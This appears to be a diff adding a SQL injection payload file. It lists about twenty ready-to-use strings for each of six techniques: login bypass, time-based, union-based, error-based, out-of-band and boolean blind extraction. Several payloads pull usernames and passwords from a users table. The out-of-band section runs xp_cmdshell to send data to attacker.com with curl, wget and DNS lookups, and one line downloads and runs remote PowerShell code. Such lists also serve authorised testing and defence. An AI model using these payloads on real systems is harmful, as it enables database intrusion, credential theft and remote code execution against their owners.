@@ -1,0 +1,129 @@
+# Refined SQL Injection Payloads (Condensed Auth Bypass, 20 per type)
+
+# 1. Auth Bypass / Boolean / Basic Termination / Concatenation / Encoding
+admin'--
+admin' #
+admin' /*!*/--
+admin' OR '1'='1'--
+admin' OR 1=1--
+admin' OR @@version like '%'
+admin' or 1=1#
+admin' or 1=1/*
+admin' or ''='
+admin') or ('1'='1'--
+admin" or "1"="1"--
+adm'||'in'--
+adm'+'in'--
+admin'||'admin'--
+admin%27--
+admin%27%2D%2D
+admin\u0027--
+0x61646d696e
+%27%20or%20%271%27%3D%271--
+%00
+
+# 2. Time-Based
+1'; SELECT SLEEP(5)--
+1'; WAITFOR DELAY '0:0:5'--
+1'; pg_sleep(5)--
+1'; DBMS_LOCK.SLEEP(5)--
+1' AND (SELECT IF(SUBSTR(@@version,1,1)='5',SLEEP(5),0))--
+1) or sleep(5)#
+1)) or sleep(5)#
+1' AND SLEEP(5)--
+1' AND BENCHMARK(1000000,MD5('A'))--
+1' AND pg_sleep(5)--
+1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+1' AND 1=IF(1=1,SLEEP(5),0)--
+1' AND IF(1=1,SLEEP(5),0)--
+1' AND IF(ASCII(SUBSTRING(@@version,1,1))=53,SLEEP(5),0)--
+1' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+1' AND (SELECT COUNT(*) FROM users WHERE SUBSTRING(password,1,1)='a' AND SLEEP(5))--
+1' AND (SELECT 1 FROM dual WHERE SLEEP(5))--
+1' AND (SELECT 1 FROM information_schema.tables WHERE SLEEP(5))--
+1' AND (SELECT 1 FROM DUAL WHERE DBMS_LOCK.SLEEP(5)=0)--
+
+# 3. Union-Based
+100' ORDER BY 1--
+100' ORDER BY 2--
+100' ORDER BY 3--
+100' ORDER BY 10--
+100' UNION SELECT 1,2,3--
+100' UNION SELECT NULL,NULL,NULL--
+-100 UNION SELECT @@version,user(),3--
+100' UNION ALL SELECT table_name,2,3 FROM information_schema.tables--
+100' UNION SELECT 1,2,3,4--
+100' UNION SELECT 1,2,3,4,5--
+100' UNION SELECT 1,2,3,4,5,6--
+100' UNION SELECT username,password,3 FROM users--
+100' UNION SELECT 1,@@version,3--
+100' UNION SELECT 1,2,version()--
+100' UNION SELECT 1,2,3,4,5,6,7,8,9,10--
+100' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12--
+100' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14--
+100' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--
+100' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--
+100' UNION ALL SELECT NULL,NULL,NULL--
+
+# 4. Error-Based
+' AND 1=CONVERT(int,@@version)--
+' OR 1=1 IN (SELECT * FROM NON_EXISTENT_TABLE)--
+' AND EXTRACT VALUE(1,CONCAT(0x5c,@@version))--
+' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--
+' AND CAST((SELECT version()) AS INTEGER)--
+' AND 1=CAST(version() AS INT)--
+' AND 1=CAST((SELECT COUNT(*) FROM users) AS INT)--
+' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--
+' AND 1=CAST((SELECT user()) AS INT)--
+' AND 1=CAST((SELECT @@version) AS INT)--
+' AND 1=CAST((SELECT schema_name FROM information_schema.schemata LIMIT 1) AS INT)--
+' AND 1=CAST((SELECT column_name FROM information_schema.columns LIMIT 1) AS INT)--
+' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1) AS INT)--
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--
+' AND 1=CAST((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) AS INT)--
+' AND 1=CAST((SELECT sql FROM sqlite_master WHERE type='table' LIMIT 1) AS INT)--
+' AND 1=CAST((SELECT tbl_name FROM sqlite_master WHERE type='table' LIMIT 1) AS INT)--
+' AND 1=CAST((SELECT type FROM sqlite_master WHERE type='table' LIMIT 1) AS INT)--
+' AND 1=CAST((SELECT rootpage FROM sqlite_master WHERE type='table' LIMIT 1) AS INT)--
+
+# 5. Out-of-Band (OOB)
+1'; DECLARE @q VARCHAR(1024);SET @q='\\'+@@version+'.attacker.com'; EXEC master..xp_dirtree @q;--
+1' UNION SELECT LOAD_FILE(CONCAT('\\',@@version,'.attacker.com\\')),2,3--
+1'; EXEC master..xp_cmdshell('curl http://attacker.com/?leak='+@@version)--
+1'; EXEC xp_cmdshell('nslookup '+@@version+'.attacker.com')--
+1'; EXEC master..xp_cmdshell('ping '+@@version+'.attacker.com')--
+1'; EXEC master..xp_cmdshell('wget http://attacker.com/?leak='+@@version)--
+1'; EXEC master..xp_cmdshell('curl -d "leak='+@@version+'" http://attacker.com')--
+1'; EXEC master..xp_cmdshell('ftp attacker.com')--
+1'; EXEC master..xp_cmdshell('tftp -i attacker.com GET '+@@version)--
+1'; EXEC master..xp_cmdshell('powershell IEX (New-Object Net.WebClient).DownloadString(''http://attacker.com/'+@@version+'')')--
+1'; EXEC master..xp_cmdshell('curl http://attacker.com/'+@@version)--
+1'; EXEC master..xp_cmdshell('curl http://attacker.com/?data='+@@version)--
+1'; EXEC master..xp_cmdshell('curl http://attacker.com/leak/'+@@version)--
+1'; EXEC master..xp_cmdshell('curl http://attacker.com/'+@@version+'/leak')--
+1'; EXEC master..xp_cmdshell('curl http://attacker.com/leak?data='+@@version)--
+1'; EXEC master..xp_cmdshell('curl http://attacker.com/leak?info='+@@version)--
+1'; EXEC master..xp_cmdshell('curl http://attacker.com/leak?ver='+@@version)--
+1'; EXEC master..xp_cmdshell('curl http://attacker.com/leak?version='+@@version)--
+1'; EXEC master..xp_cmdshell('curl http://attacker.com/leak?db='+@@version)--
+
+# 6. Boolean-Based Blind
+123' AND SUBSTR(@@version,1,1)='5'--
+123' AND (SELECT COUNT(*) FROM users)>0--
+123' AND LENGTH(@@version)=6--
+123' AND ASCII(SUBSTRING(@@version,1,1))=53--
+123' AND (SELECT 1 FROM users WHERE LENGTH(password)>8)--
+123' AND (SELECT 1 FROM users WHERE ASCII(SUBSTRING(password,1,1))=97)--
+123' AND (SELECT 1 FROM information_schema.tables WHERE table_schema=database())>0--
+123' AND (SELECT 1 FROM information_schema.columns WHERE table_name='users')>0--
+123' AND (SELECT 1 FROM dual WHERE ROWNUM=1)=1--
+123' AND EXISTS(SELECT 1 FROM users)--
+123' AND (SELECT 1 FROM sqlite_master WHERE type='table')=1--
+123' AND (SELECT 1 FROM sqlite_master WHERE type='table' AND name='users')=1--
+123' AND (SELECT 1 FROM mysql.user LIMIT 1)=1--
+123' AND (SELECT 1 FROM pg_user LIMIT 1)=1--
+123' AND (SELECT 1 FROM pg_tables LIMIT 1)=1--
+123' AND (SELECT 1 FROM pg_class WHERE relname='users')=1--
+123' AND (SELECT 1 FROM pg_roles LIMIT 1)=1--
+123' AND (SELECT 1 FROM pg_database LIMIT 1)=1--
+123' AND (SELECT 1 FROM pg_stat_activity LIMIT 1)=1-- 
